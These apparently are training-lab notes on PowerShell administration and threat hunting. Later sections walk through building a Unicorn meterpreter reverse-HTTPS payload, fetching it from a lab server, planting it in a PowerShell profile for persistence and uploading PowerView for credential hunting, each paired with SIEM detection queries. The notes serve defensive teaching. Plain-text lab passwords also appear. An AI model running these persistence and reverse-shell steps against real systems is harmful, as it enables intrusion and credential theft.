Use Get-Process
Get-Process
﻿

The cmdlet Get-Process retrieves information on the processes running on a local host. Running Get-Process on its own returns a list of all active processes on the host. Thereafter, additional commands can be run to drill down into specific processes and discover more information.

﻿

Use Get-Process
﻿

Use Get-Process to retrieve all processes on a local host, as well as detailed information and specific version data on specific processes on the local host. Continue using the VM dc01 to work in PowerShell as an Administrator.

﻿

Workflow﻿

﻿

1. In PowerShell, return the fields Id, Name, and Path for all active processes by running the following command:

Get-Process | Format-Table Id, Name, Path

![image](https://github.com/user-attachments/assets/22e75adc-ae0b-48bf-8768-a5d7d4b38953)

﻿

2. Return detailed information on the processes conhost and lsass by running the following command:

Get-Process conhost, lsass | Format-List *

![image](https://github.com/user-attachments/assets/20241f69-a7a5-48bd-b321-6211ccec0e0e)


﻿

3. Retrieve the version information on the process conhost by running the following command:

Get-Process conhost -FileVersionInfo 2>$null
﻿

The 2>$null part of the command redirects errors to $null, rather than printing them.

﻿![image](https://github.com/user-attachments/assets/e769c9bf-1ec7-455b-9f0c-b33cb1581e8c)


Use Get-Service
Get-Service
﻿

The cmdlet Get-Service retrieves information on the services running on a local host. Running Get-Service on its own returns a list of all services on the host.

﻿

Use Get-Service
﻿

Use Get-Service to retrieve all running services on a local host, all running services that contain a specific string, and additional details on a specific service running on the local host. Continue using the VM dc01 to work in PowerShell as an Administrator.

﻿

Workflow
﻿

1. In PowerShell, list all running services by entering the following command:

Get-Service | Where-Object {$_.Status -eq "Running"}

![image](https://github.com/user-attachments/assets/bc5333c1-4e3d-4dec-8d02-702d5e3f4b90)

﻿

2. Display all running services that have names starting with net by running the following command:

Get-Service -Name "net*" | Where-Object {$_.Status -eq "Running"}

![image](https://github.com/user-attachments/assets/04353e40-d962-4b9c-9f7b-879d41ee3f72)

﻿

3. Return additional details about the service Netlogon by running the following command:

Get-Service -Name Netlogon | Format-List *

![image](https://github.com/user-attachments/assets/192e68e0-3287-4d2a-97d7-114f1c2c807f)

﻿Use Get-HotFix
Get-HotFix
﻿

The cmdlet Get-HotFix queries installed hotfixes on a local or remote computer. This is useful when auditing a group of systems to ensure important hotfixes have been applied. Running Get-HotFix by itself lists all hotfixes on the local machine. 

﻿

Use Get-HotFix
﻿

Use Get-HotFix to retrieve all installed hotfixes on a remote host, hotfixes containing a specific string, and a hotfix with a specific hotfix Identifier (ID). Continue using the VM dc01 to work in PowerShell as an Administrator.

﻿

Workflow
﻿

1. In PowerShell, return all hotfixes installed on bp-wkstn-9 by running the following command:

Get-HotFix -ComputerName bp-wkstn-9

![image](https://github.com/user-attachments/assets/94fb28c0-a24e-443f-99b9-c233f861a4f7)

﻿

2. Display security update hotfixes, sorted by the date installed, by running the following command:

Get-HotFix -Description Security* -ComputerName bp-wkstn-9 | Sort-Object -Property InstalledOn

![image](https://github.com/user-attachments/assets/69421116-3e60-4531-beeb-d24694f8de4e)

﻿

3. Return detailed information on a specific hotfix run by running the following command:

Get-HotFix -Id KB2847927 -ComputerName bp-wkstn-9 | Format-List *

![image](https://github.com/user-attachments/assets/ee7cfd8f-2f9f-474c-aac8-9af878ae7228)

﻿

The commands in this lab enable analysts to query installed hotfixes on a remote computer.

The commands in this lab enable analysts to retrieve information on services running on a local host. 
The commands in this lab enable analysts to retrieve useful information about a process running on a local host.

![image](https://github.com/user-attachments/assets/492a7da9-8832-4f71-b550-33825d551af1)


![image](https://github.com/user-attachments/assets/b0d8fe1c-5144-401e-8328-fe73e9b21ac8)

![image](https://github.com/user-attachments/assets/6822dcc5-30c8-4a84-9c2a-e0153a63f4a6)

![image](https://github.com/user-attachments/assets/f13051ff-c3bc-40c8-b0cc-1abcdb378898)

![image](https://github.com/user-attachments/assets/56cc2471-7e67-4a92-a840-18bc60c144da)


![image](https://github.com/user-attachments/assets/39cdef8f-cf5c-4194-ad82-a074a440ddbb)


############System Settings Queries###########
Using PowerShell to query and set system settings increases the efficiency of many tasks. Instead of clicking through a graphical user interface, PowerShell uses elegant commands that quickly perform almost any task imaginable on Windows systems. The next set of task cards introduces the following types of cmdlets:

Group Policy Object (GPO)
Item
NetFirewallRule
To explore additional modules and cmdlets on the system, use the cmdlets Get-Module and Get-Command.


Use GPO Cmdlets
GPO Cmdlets
﻿

The GPO cmdlets are part of the module GroupPolicy. These cmdlets administer Group Policy in a Windows Server.

﻿

Use GPO Cmdlets
﻿

Use GPO cmdlets to retrieve information on GPO policies in a domain, create a new GPO policy, and export a report about the newly created GPO policy.

﻿

Workflow
﻿

1. Log in to the VM dc01 using the following credentials: 

Username: trainee
Password: CyberTraining1!
﻿

2. Using an administrative PowerShell, return all GPOs on the domain energy.lan by running the following command:

Get-GPO -All -Domain "energy.lan"

![image](https://github.com/user-attachments/assets/c60d3925-b777-4a35-bd60-940840259c9c)

﻿

3. Create a new GPO in the domain of the user with the cmdlet New-GPO, as follows:

New-GPO -Name "ScreenSaverTimeout" -Comment "This sets the screen saver timeout to 5min."

![image](https://github.com/user-attachments/assets/3fde0927-b764-423a-a44e-d2fd7ff83add)

﻿

4. Apply a registry-based policy to the new GPO by running the following command:

Set-GPRegistryValue -Name "ScreenSaverTimeout" -Key "HKCU\Software\Policies\Microsoft\Windows\Control Panel\Desktop" -ValueName ScreenSaveTimeOut -Type String -Value 300

![image](https://github.com/user-attachments/assets/584ab546-d4ff-47b7-bd85-b7b9d279e335)

﻿

5. Link the GPO to an Organizational Unit (OU) by running the cmdlet New-GPLink, as follows:

New-GPLink -Name "ScreenSaverTimeout" -Target "ou=bp,dc=energy,dc=lan"

![image](https://github.com/user-attachments/assets/a186d5bd-ca66-4072-8db4-d16a71bcb154)

﻿

6. Save a HyperText Markup Language (HTML) report of the new GPO to the desktop by running the cmdlet Get-GPOReport, as follows:

Get-GPOReport -Name "ScreenSaverTimeout" -ReportType HTML -Path "C:\Users\trainee\Desktop\gporeport.html"

![image](https://github.com/user-attachments/assets/0b149a39-486f-40a3-9ea0-b2c513617828)

﻿

7. Open and review the newly generated report.

﻿

The commands in this lab enable analysts to query information on and create Group Policy objects. The GPO report generated in the last step displays information about a GPO that can be shared with the team. The information is identical to what is presented in the Group Policy editor in Windows. 


Use Item Cmdlets
Item Cmdlets
﻿

The item cmdlets are part of the module Microsoft.PowerShell.Management. These cmdlets query and set items in different types of data stores. For example, item cmdlets may be used to query and modify registry keys.

﻿

Use Item Cmdlets
﻿

Use Item cmdlets to retrieve information on a registry key, create a new registry entry, and remove a registry key. Continue using the VM dc01 to work in PowerShell as an Administrator.

﻿

Workflow
﻿

1. In PowerShell, query a run key in the local machines registry by entering the following command:

Get-Item HKLM:\Software\Microsoft\Windows\CurrentVersion\Run

![image](https://github.com/user-attachments/assets/16bc4f1d-f783-4f63-baf9-6f26780045da)

﻿

2. Create a new property in the run key with the cmdlet New-ItemProperty, as follows: 

New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Notepad" -Value "%windir%\system32\notepad.exe"


![image](https://github.com/user-attachments/assets/4583793e-59cd-4022-8709-54db5694e9e2)

﻿

The cmdlet New-Item is also available to create a whole new registry key.

﻿

3. Display the new property by running the cmdlet Get-Item, as follows:

Get-Item HKLM:\Software\Microsoft\Windows\CurrentVersion\Run

![image](https://github.com/user-attachments/assets/c66389bd-2c68-4bde-a813-32725d9a4237)

﻿

4. Delete the property by running the cmdlet Remove-ItemProperty, as follows:

Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Notepad"


![image](https://github.com/user-attachments/assets/254ae910-de33-47db-96e1-ffa7a0b55d06)

﻿

The commands in this lab enable analysts to query the  registry and manage registry e ntries on a local host.



 Use NetFirewallRule Cmdlets
NetFirewallRule Cmdlets
﻿

The NetFirewallRule cmdlets are part of the module NetSecurity and are used to modify host firewall rules.

﻿

Use NetFirewallRule Cmdlets
﻿

Use NetFirewallRule cmdlets to retrieve a local host's firewall profiles, retrieve information on a local host's firewall rules, create a new firewall rule on the local host, and disable a firewall rule on a local host. Continue using the VM dc01 to work in PowerShell as an Administrator.

﻿

Workflow
﻿

1. In PowerShell, list all the firewall profiles on the local host by running the following command:

Get-NetFirewallProfile -All

![image](https://github.com/user-attachments/assets/3c61ee6e-7e46-4473-bbd6-d1971c32b541)

﻿

2. List all the rules in the profile domain by entering the cmdlet Get-NetFirewallRule, as follows:

Get-NetFirewallProfile -Name Domain | Get-NetFirewallRule


![image](https://github.com/user-attachments/assets/ad6a3629-c808-4b85-b2d9-c16c2b036fe0)

﻿

3. Create a new firewall rule in the domain profile to block all outbound traffic to port 1337 by running the cmdlet New-NetFirewallRule, as follows:

New-NetFirewallRule -DisplayName "Block Outbound Port 1337" -Direction Outbound -LocalPort 1337 -Protocol TCP -Action Block -Profile Domain


![image](https://github.com/user-attachments/assets/131b2203-0076-4bea-9aa8-333bcccf2229)

﻿

4. Review the new rule using the cmdlet Get-NetFirewallRule, as follows:

Get-NetFirewallRule -DisplayName "Block Outbound Port 1337"

![image](https://github.com/user-attachments/assets/bb027a99-9d76-429b-9ec5-86f3b3c1e0fd)

﻿

5. Disable the new rule with the cmdlet Disable-NetFirewallRule, as follows:

Disable-NetFirewallRule -DisplayName "Block Outbound Port 1337"


﻿

6. Verify the rule was disabled by viewing the information output by the following command:

Get-NetFirewallRule -DisplayName "Block Outbound Port 1337"


 ![image](https://github.com/user-attachments/assets/8a9b0db4-c0b3-487b-bc8c-a30fb7f15d1e)


What cmdlet creates a registry key?
new-item

![image](https://github.com/user-attachments/assets/76a94f64-cc60-4b72-8bd2-97559c391863)

![image](https://github.com/user-attachments/assets/27107de2-2290-4db7-9819-e9f0b7574e90)





If Enabled is set to False, this indicates that the rule is successfully disabled. This last step and the previous commands presented in this lab enable analysts to interact with a local host firewall and manage its rules.


![image](https://github.com/user-attachments/assets/ace73505-374b-4a7d-b24e-0cba926a4a87)

![image](https://github.com/user-attachments/assets/24c10258-8896-4981-bbc3-60a8f17eec76)

![image](https://github.com/user-attachments/assets/ecc5befb-61b7-40fd-befa-d4033415d62c)


![image](https://github.com/user-attachments/assets/30b7c3a7-315e-4923-a66d-9c5765761d1e)


![image](https://github.com/user-attachments/assets/474b5c2d-98bd-429c-b595-ae6cd6df9c89)

![image](https://github.com/user-attachments/assets/821e7e2c-34e9-41cf-81eb-f8491b8f4951)


What profile includes the firewall rule File Server Remote Management (SMB-In)?

What command blocks inbound traffic over port SMB by creating a new firewall rule named Block Inbound SMB?

What firewall profile is enabled on dc01?





Atomic Red Team
Testing a system's environment for PowerShell execution is one way to determine whether the system and user account are susceptible to attacks that weaponize PowerShell. These types of attacks use the PowerShell framework and ecosystem for exploitation, persistence, and lateral movement.

﻿

Atomic Red Team is a powerful tool for performing these types of tests. This tool works just as well on individual systems as it does across an enterprise, which may need it.

﻿

This lab will utilize Atomic Red Team to test for vulnerabilities associated with MITRE ATT&CK Technique T1059.001 - Command and Scripting Interpreter: PowerShell.

﻿

Using Atomic Red Team
﻿

Employ the Atomic Red Team framework to test the PowerShell functions in an environment that are allowed by existing policies and controlled. These functions may be used by an attacker.

﻿

Workflow
﻿

1. Log in to the Virtual Machine (VM) eng-wkstn-1 with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Powershell as an Administrator.

﻿

3. Display the list of available PowerShell execution tests by entering the following command:

﻿

Invoke-AtomicTest T1059.001 -ShowDetailsBrief

![image](https://github.com/user-attachments/assets/fb092bb3-b26c-4044-8538-bd31dcfef119)

﻿

4. Some of these tests are built into the Atomic Red Team framework, while others may have additional requirements such as third party scripts, libraries, or executables. Check the prerequisites for these tests by entering the following command:

Invoke-AtomicTest T1059.001 -CheckPrereqs

﻿

Observe that some of the tests failed the prerequisite checks. This is not uncommon and indicates that certain tests will not run properly due to missing requirements. All the other tests will still run successfully.

﻿

5. Run the tests with the following command:

Invoke-AtomicTest T1059.001
﻿

Executing the command in step 5 runs four sets of tests for assessing tools and techniques in the following categories:

Set 1: Downloaded scripts
Set 2: Security controls bypasses
Set 3: Spawning
Set 4: Known malicious cmdlets
The first set of tests determine whether script-based tools may be downloaded from an external network to run on the local machine. These tools may include Mimikatz from the PowerSploit framework or Bloodhound ingestors. The second set of tests determine whether certain User Access Control (UAC), security, and code execution bypasses are successful in the environment. These bypasses include the following:

Mshta
Extensible Markup Language (XML)
XML Component Object Model (COM) object
Fileless script execution
PowerShell Downgrade
Alternate Data Streams (ADS) access
The third set of tests determine whether PowerShell can spawn other PowerShell sessions. The fourth and final set of tests determine whether certain known malicious cmdlets are allowed to run in the environment. This includes the malicious cmdlets from the PowerSploit framework that malicious parties frequently use in their attacks.

﻿

A successful result on an Atomic test indicates a security hole in the mission partner infrastructure. These vulnerabilities must be addressed through security controls, group policy restrictions, and strict configurations. Prolific logging is also essential for capturing any threat exploitation that cannot be sufficiently mitigated.



Persistence with PowerShell Profiles
PowerShell is useful for executing persistence methods such as adding scheduled tasks and creating new registry values. PowerShell can also install new services that establish a persistent connection back to a malicious command and control server. Another common method of establishing persistence with PowerShell is to manipulate a user's PowerShell profile. A profile is the script that runs automatically when a session is constructed to personalize the environment. Since profiles are scripts, additional commands and code may be added to them.

﻿

Complete the following set of labs to create a Unicorn payload, establish persistence in the PowerShell profile, and detect PowerShell profile persistence.

﻿

Create a Unicorn Payload
﻿

Add persistent functionality to the user’s PowerShell profile with the PowerShell persistence creation tool Unicorn. Then, examine machine logs in Kibana to view the defender’s perspective of this malicious activity. 

﻿

Workflow
﻿

1. Log in to the VM kali-hunt with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open a terminal window.

﻿

3. Change directories to the Unicorn directory by entering the following code:

(trainee@dmss-kali)-[~]$cd /home/trainee/unicorn
﻿

4. Generate the Metasploit setup script and PowerShell shellcode that creates a persistent reverse HTTPS shell by entering the following command:

(trainee@dmss-kali)-[~/unicorn]$ ./unicorn.py windows/meterpreter/reverse_https 199.63.64.51 5555
﻿

The command from this step creates the files powershell_attack.txt and unicorn.rc, as displayed in Figure 12.1-1, below:



If the attack command in powershell_attack.txt is placed in the PowerShell profile in its current state, it will create an unacceptable loop. To resolve this, the flag -noprofile must be manually added to the code. 


5. Ensure that child PowerShell processes run without the profile enabled by running the following command:
(trainee@dmss-kali)-[~/unicorn]$ sed -z -i 's/\n/\r\n/g;s/powershell/powershell -noprofile/g' powershell_attack.txt



6. Display the commands to add to the PowerShell profile by printing the contents of the file powershell_attack.txt.


This file will be downloaded to the victim device.


7. Start a listener with the following command:
(trainee@dmss-kali)-[~/unicorn]$ sudo msfconsole -r unicorn.rc
[sudo] password for trainee: CyberTraining1!

![image](https://github.com/user-attachments/assets/27ef2357-7251-4f4b-962c-0cb7d31499c4)




8﻿. In a separate window, change directories to the Unicorn directory by entering the following code:
(trainee@dmss-kali)-[~]$cd /home/trainee/unicorn



9. Host the file powershell_attack.txt in an ad hoc Python web server to transfer it to the target by executing the following command:
(trainee@jdmss-kali)-[~/unicorn]$ python3 -m http.server





Establish Persistence in the PowerShell Profile


Having created a persistence payload with Unicorn, emulate an attacker with access to a victim Windows machine in the mission partner network in order to place the payload in the PowerShell Profile that is loaded when a user initiates a PowerShell session. 


Workflow


1. Log in to the VM eng-wkstn-1 with the following credentials:
Username: trainee
Password: CyberTraining1!



2. Open a PowerShell terminal.


3. Determine whether the current user has an active PowerShell profile and its path by entering the following command:
PS C:\Users\trainee> echo $profile



NOTE: The file from step 3 may not be visible in the file explorer. The folder WindowsPowerShell in a user’s documents is hidden by default.


4. Test whether this profile exists by entering the following command:
PS C:\Users\trainee> Test-Path $profile

![image](https://github.com/user-attachments/assets/2a23b630-6c7d-4736-ac9e-82fcc6a1ddea)




The profile does not exist, so the document will need to be created.


5. Create a profile for the current user with the following command:
PS C:\Users\trainee> New-Item -Path $profile -Type file -Force

![image](https://github.com/user-attachments/assets/e00f6343-b87d-48be-aa2c-c2d3e89aaa55)




6. Create a file for the Unicorn payload by entering the following:
PS C:\Users\trainee> New-Item -Path "C:\Windows\Temp\launch.bat" -Type file -Force

![image](https://github.com/user-attachments/assets/f65b83e9-990e-4e98-b12a-56f6dbfacafb)


7. Retrieve the payload from the malicious server by entering the following command:
PS C:\Users\trainee> (Invoke-webrequest -URI "http://199.63.64.51:8000/powershell_attack.txt").Content | Out-File -FilePath "C:\Windows\Temp\launch.bat"



An attacker completes this file transfer activity during an active session, before leaving the machine. This ensures the attacker has continued access.


8. Prepare the persistence command to add to the profile by entering the following:
PS C:\Users\trainee> $string = 'Start-Process -FilePath "powershell" -ArgumentList "-noprofile -command `"IEX(GC C:\Windows\Temp\launch.bat -Raw)`""'



9. Add the command to the profile with the following command:
PS C:\Users\trainee> $string | Out-File -FilePath $profile -Append



10. Type exit to close the current PowerShell session and open a new session to trigger the persistence.


11. Return to the VM kali-hunt to view the new session that is created.


Since the persistence is triggered by opening a PowerShell session, an attacker can now maintain access to the machine, but this technique is not invisible. Evidence of such unusual activity may be visible in system logs if the mission partner has enabled the appropriate logging and threat detection mechanisms.


Detect PowerShell Profile Persistence


Move to the VM win-hunt to display the traces of persistence in the logs located on a central SIEM.


Workflow


1. Log in to the VM win-hunt with the following credentials
Username: trainee
Password: CyberTraining1!



2. Open the bookmark for Discover - Elastic in the browser Chrome and enter the following credentials when prompted:
Username: trainee@jdmss.lan
Password: CyberTraining1!



3. Find evidence of PowerShell processes created by other PowerShell processes by entering the following search terms in the query bar:
event.code:1 and process.executable :*powershell.exe and process.parent.executable :*powershell.exe

![image](https://github.com/user-attachments/assets/45543e9a-b1e8-458d-9f0a-fea30f68488e)


The command line of the process created in step 3 is the persistence command that was downloaded from the malicious machine. Figure 12.1-2, below, displays the plaintext malicious payload that the Unicorn tool created. This type of code is unusual when compared to the normal administrative functions that a Windows system administrator might employ PowerShell to do. It is even more unusual as an automatic block of code executed at the beginning of every PowerShell session.



![image](https://github.com/user-attachments/assets/1c54d006-10fe-4d23-a383-8867013dd231)

![image](https://github.com/user-attachments/assets/151a276f-8268-41fb-8e4c-40cc7950d99e)

PowerSploit
PowerSploit is a set of attack tools that are written in PowerShell. These tools provide advanced reconnaissance, exploitation, privilege escalation, persistence, and lateral movement functionality to an attacker. However, before attackers can use PowerSploit, they must first bring the tools into an environment and execute them. 

﻿

Use PowerSploit
﻿

Access the attacker’s workstation again to employ this powerful toolkit written in PowerShell for local enumeration and reconnaissance on a compromised machine. The PowerSploit tools are already on the Kali machine. An attacker would simply need to execute a file upload to the victim workstation to execute them. 

﻿

Workflow
﻿

1. Log in to the VM kali-hunt with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Bring up the Metasploit session created from the persistence established in previous labs by entering the following command:

msf6 exploit(multi/handler) > sessions -i 1
﻿

NOTE: if the previous session is closed, trigger the persistence again by executing the following command in a Kali terminal window and opening a new PowerShell session on the victim machine:

(trainee@dmss-kali)-[~/unicorn]$ sudo msfconsole -r unicorn.rc
[sudo] password for trainee: CyberTraining1! 

![image](https://github.com/user-attachments/assets/d99ea548-9c11-41ec-9fa2-c241ba4c4095)

﻿

3. Load the application interface that allows the creation of an interactive shell by entering the following command:

meterpreter > load stdapi
﻿

4. Transfer the PowerSploit toolkit to the victim device with the following command:

meterpreter > upload /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 "C:\Windows\Temp\PowerView.ps1"
﻿

5. Enter an interactive shell on the machine by entering the following:

meterpreter > shell
﻿

6. Load the PowerSploit PowerView functions by running the following series of commands:

C:\Users\trainee> powershell
﻿

PS C:\Users\trainee> Set-ExecutionPolicy Bypass
﻿

PS C:\Users\trainee> cd C:\Windows\Temp\
﻿

PS C:\Windows\Temp> . .\PowerView.ps1
﻿

The commands from step 6 enable reconnaissance on the exploited machine to find any information that is useful for future phases of the attack.

﻿

7. Search for any credentials left on the machine with the following PowerView function:

PS C:\Windows\Temp> Find-InterestingFile -Path "C:\Users"
﻿

Parsing through the output displays the entry in Figure 12.1-3, below:

﻿
4. Return to the VM win-hunt to view any evidence of the activity that may be available.


5. Open the bookmark for Kibana Discover - Elastic in the browser Chrome and enter the following credentials if prompted:
Username: trainee@jdmss.lan
Password: CyberTraining1!



6. Determine whether explicit credentials were used for a logon in the logs shipped to Elastic by entering the following query:
event.code: 4648 and winlog.event_data.TargetInfo:HTTP*



This returns all records that explicitly supply credentials to conduct network logons to the HTTP service of a workstation. HTTP is the protocol over which WinRM communicates. WinRM uses either the alternative port 5985 or 5986 when using the HTTPS version of WinRM.


If an attacker records those credentials separately and moves laterally from a different endpoint, the WinRM activity may still be monitored from the receiving host. The tool Evil-WinRM is available on the VM kali-hunt for this demonstration.

Profile File Locations and Hierarchy


PowerShell profiles have a hierarchical structure. PowerShell loads the profile that is the most specific to the current session first, then checks to see if another profile higher up in the hierarchy should run if a more specific profile is not being used. If an online guide does not specify the profile being used, then the profile Current user, Current host is assumed to be the default. In a PowerShell session, executing the command $Profile displays the current path set for the profile variable. Table 12.2-1, below, lists the profile hierarchy with each profile’s file location, starting from the highest point of the hierarchy:
![image](https://github.com/user-attachments/assets/913ec97b-4e59-43aa-b0df-61e7c4aeb6a7)
![image](https://github.com/user-attachments/assets/913ec97b-4e59-43aa-b0df-61e7c4aeb6a7)




Both Current User profiles are stored in the user's Documents folder. In a Windows Domain environment, this folder follows its user from system to system. This means that PowerShell profiles stored in the user's Documents folder are accessible across multiple hosts without requiring user intervention. While the ease and mobility of persistent profiles is helpful, this convenient feature is also exploitable in a few attack scenarios that this lesson examines in upcoming sections.


What Are PowerShell Profiles?


PowerShell profiles are scripts that load regularly-used elements in a Windows PowerShell ISE session. PowerShell has two "modes": the console and the ISE. The PowerShell console is the standard shell that many systems administrators use to perform simple tasks such as user management, system updates, and any other one-off PowerShell commands that need to be run. The ISE is used for scripting more complex tasks such as applying all the configuration changes necessary to make a fresh install of Windows compliant with specific government standards. Any changes required in the configuration script are implemented in the ISE. Users add any necessary environmental elements to their profiles. An example of a profile element is an array of registry keys that a user may need to change.


For defense purposes, profiles provide one of the most powerful system tools for threat hunting. In an example scenario, cybersecurity researchers may maintain a list of Advanced Persistent Threat (APT) actors and regularly update a publicly available website with new Indicators of Compromise (IoC). In this case, a defender could create a PowerShell script that downloads the relevant data from the IoC site and adds it to an array in the current session. That script could then be added to the PowerShell profile. This way, every time that the defender loads a new PowerShell session, the script downloads the most recent APT-related data to use.

PowerShell Object Persistence
PowerShell objects are similar to objects in object-oriented programming. In the context of security defense, objects act as containers that store different kinds of information about other elements in the operating system. For example, the object ServiceController manages any given service on a host. This object has cmdlets such as Start-Service, Stop-Service, Set-Service, and get-Service. The PowerShell commands related to this object manage various application and system services on a host.

﻿

Defenders commonly gather information from a specific object for examination during a hunt, also known as baselining. In an example scenario, an exploit might alter a system service in a way that is not logged by normal logging methods. An analyst might then need to export the status of the service under specific conditions to verify potential compromise. The analyst would then baseline by creating a persistent snapshot of the service object to use for later analysis. The third-party PowerShell modules like "DeepBlueCLI" export a saved snapshot of the object in several different formats for analysis. The other method of creating a baseline with a persistent object is to create a script that grabs the object information at startup in the PowerShell profile. For example, analysts could create a script that always checks system resource usage when a PowerShell profile is loaded to verify that their current host is behaving as intended. This script would act as the baseline for the defenders.﻿

﻿

Persistent Object Exploitation
﻿

Adversaries often attempt to hijack an administrator's session to gain persistence within the administrator's PowerShell profile. One example of a session hijack exploit is an attack that was used in tandem with the Common Vulnerabilities and Exposures (CVE) CVE-2021-40444, wherein a malicious Dynamic-Link Library (DLL) file is deposited into the directory /tmp/. A path traversal vulnerability was exploited to add malicious code into the PowerShell profiles that the current active user has access to. The attack utilizes MITRE ATT&CK code T1546.013, Event Triggered Execution: PowerShell Profile, which illustrates this as an event triggered execution technique.

﻿

Many PowerShell profile exploits require another type of compromise, such as phishing, to attack PowerShell directly. However, profile compromise is one example as to why defenders should encourage their organization to focus on local vulnerabilities that adversaries will seek to exploit post-compromise.

﻿

PowerShell objects are another vector for potential compromise that defenders must be vigilant about. Exploiting objects is one example of a fileless malware attack, since objects are not explicit files. Rather, objects are containers for other system functions. Adversaries use exploits, such as a compromised website, to open a silent PowerShell session, inject encrypted scripts, and stealthily “live off of the land” without putting an actual file on the compromised target. An adversary could use this fileless malware technique to inject their malicious code into the object, so that when the object is called and logged, it appears as normal administrative tasks. This would be the attack T1546.015, Event Triggered Execution: Component Object Model Hijacking.

﻿

Examining PowerShell objects requires hybrid analysis, which is an advanced technique that will be covered in a later module.

2. Launch PowerShell as an administrator.


3. Enable the use of scripts within PowerShell by entering the following command:
PS C:\Windows\system32> Set-ExecutionPolicy Bypass -Scope CurrentUser -Force



4. Create a fresh PowerShell profile with the following command since a powershell does not have one configured by default:
PS C:\Windows\system32> New-Item -Path $PROFILE -type File -force

![image](https://github.com/user-attachments/assets/b518f305-0263-42eb-b9c7-76457d7e09d5)

5. Open the profile as a text file to edit it by entering the following command:
PS C:\Windows\system32> start C:\Users\trainee\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1



6. Add the following text in the new profile window to launch a simple function each time the profile is loaded:
Get-Service | Get-Member



The function Get-Member lists the properties and methods of the cmdlet Get-Service.
 
7. Save and exit the profile file.


8. Reopen PowerShell. 


The list of options for the Get-Service object is now displayed as part of the profile file, as indicated in Figure 12.2-2, below:


![image](https://github.com/user-attachments/assets/be483c4f-d80d-4f7a-8263-35aa65a7e1c1)
![image](https://github.com/user-attachments/assets/be483c4f-d80d-4f7a-8263-35aa65a7e1c1)

![image](https://github.com/user-attachments/assets/b518f305-0263-42eb-b9c7-76457d7e09d5)


9. To conduct an attack, overwrite the current profile with a premade compromised profile by entering the following command:
PS C:\Windows\system32> Copy-Item C:\Users\trainee\Documents\Microsoft.PowerShell_profile.ps1 C:\Users\trainee\Documents\WindowsPowerShell\ -Force



This overwrites the default user profile with a malicious profile from the specified file location.


10. Exit PowerShell and reopen it to view the compromised profile.

![image](https://github.com/user-attachments/assets/d697dd6c-a54d-4af3-b897-e315d546fd16)


A document pops up as an example of an object being loaded that the user did not configure.


11. Exit the document window that the compromised profile opened.


12. Reset the profile to clear the compromised command with the following command:


PS C:\Windows\system32> Clear-Content C:\Users\trainee\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1



14. Exit and reopen PowerShell to verify that the profile has been cleared.




![image](https://github.com/user-attachments/assets/eb31cc30-4211-42a4-84bc-48f447338776)






![image](https://github.com/user-attachments/assets/fc224701-a44b-4151-bd42-4ec2d4d3fecd)






![image](https://github.com/user-attachments/assets/6cfcb158-46cc-4370-808f-e35ba408d34f)





![image](https://github.com/user-attachments/assets/4c262336-4c25-4903-b800-73a8028bb327)



Defense against Persistent Object Exploitation
Detecting hijacked sessions and fileless malware can be tricky, but monitoring for the following events can help indicate and track a compromise:

Unusual commands

New profile files

New process execution or creation

﻿Unusual Commands﻿

﻿

Defenders may identify a compromise by monitoring abnormal PowerShell commands that sysadmins do not normally use. Most organizations have a set of approved methods for administration that they regularly use, so logs warrant investigation when they indicate commands that are rarely used.

﻿

﻿

New Profile Files﻿

﻿

PowerShell profile locations should also be monitored for the creation of new files. PowerShell profiles are often edited, rather than newly created within a production environment. If Security Information and Event Management (SIEM) log alerts display new PowerShell profiles being created, this is a cause for concern for defenders.

﻿

New Process Execution or File Creation﻿

﻿

Good security practice for defenders also includes monitoring log alerts for new process or file creations. New process execution from PowerShell may indicate that adversaries have compromised that process, or that they're using a normal system process or application as part of their attack. Monitoring these types of logs are also useful to identify potential indicators of attack beyond PowerShell.


 
![image](https://github.com/user-attachments/assets/4c262336-4c25-4903-b800-73a8028bb327)

![image](https://github.com/user-attachments/assets/6cfcb158-46cc-4370-808f-e35ba408d34f)






Finding Exploitable Objects
Component Object Models (COM) and their relevant Class Identifiers (CLSID) represent any number of objects on a system. The exploit example in the following workflow implements registry key COMs and their linked CLSIDs. This workflow also uses a PowerShell module developed by security researcher David Tulis, called acCOMplice.

﻿

Investigating Vulnerable PowerShell Objects
﻿

Some applications will contain hard-coded references to DLLs that are not actually installed. This means that an attacker could place compromised DLLs where an application expects them, which the legitimate application may execute during normal operation. Use the COM Hijack Toolkit to investigate any potential objects that are vulnerable to this type of compromise.

﻿

Workflow
﻿

1. Log into the VM win-hunt with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open PowerShell as an administrator.

﻿

3. Import the module acCOMplice into this session with the following command:

PS C:\Windows\system32> Import-Module C:\Users\trainee\Documents\acCOMplice\COMHijackToolkit.ps1
﻿

4. Find all registry keys that have symbolic links to files that do not exist by entering the following command:

###############PS C:\Windows\system32> Find-MissingLibraries########################



![image](https://github.com/user-attachments/assets/a12eac07-b092-493e-9a34-2bcfb7ba2646)


If an adversary was able to enumerate these keys, they could create malicious files with the found DLL names. The relevant registry keys would execute those malicious DLLs after running the relevant application's code. An adversary could then hide within an installed application using a file that is expected to exist. 


Use the information from this workflow to answer the next question.






PowerShell Launcher Steps
Attackers use PowerShell stagers to hide the details of the final payload and to execute a larger payload in an environment that has command size limitations. For example, if an attacker schedules a task on a remote system, it is difficult to pass an entire malicious payload in the limited amount of characters allowed. It is possible to craft a command that reaches out over the network and executes a larger script. By having the command reach out, it also helps hide what is being executed by the malicious actor. The logging configuration may only catch the code that reaches out to execute more code.

﻿

Launcher/stager scripts are primarily designed to obtain data from the network and execute that data. If execution on this system is achieved by starting PowerShell, there are a few useful options that attackers pass to PowerShell.exe to help ensure their script runs.

﻿

Table 12.3-1 describes the common options that attackers use to execute PowerShell.

 ![image](https://github.com/user-attachments/assets/1320161b-8b02-4e26-9227-2fed9cf647f4)

Getting Data from the Network


Most of the time the attacker wants the PowerShell launcher to call back to a server they are controlling. There are situations where making PowerShell listen on a port is useful, however, local firewalls typically prevent this type of connection so a listening launcher is not as useful. This section covers both ways to get data from a network into PowerShell.


Outbound Connections


